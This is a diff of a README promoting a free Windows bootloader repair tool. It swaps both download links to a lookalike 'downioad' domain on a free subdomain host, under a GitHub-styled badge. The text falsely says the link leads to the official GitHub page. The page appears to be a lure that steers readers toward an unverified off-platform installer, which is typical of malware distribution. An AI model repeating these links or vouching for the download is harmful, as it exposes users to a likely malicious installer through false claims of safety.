@@ -2,7 +2,7 @@
 
 In 2026, the Bootloader Repair Tool stands out as an essential utility for Windows users facing startup problems. This free software enables quick and efficient repair of Windows bootloader issues, ensuring system stability and data safety on Windows 10 and 11 devices.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What Makes This Tool Stand Out
 
@@ -58,7 +58,7 @@ A: It's not necessary for regular use, but keep it handy for emergencies. Run it
 
 Always download the most recent version to benefit from updates and fixes. The download link provided leads to the official GitHub page where you can access the installer safely.
 
-[Get it here](https://download-page.page.gd/)
+[Get it here](https://downioad.page.gd/)
 
 **Last Updated**: March 2026
 
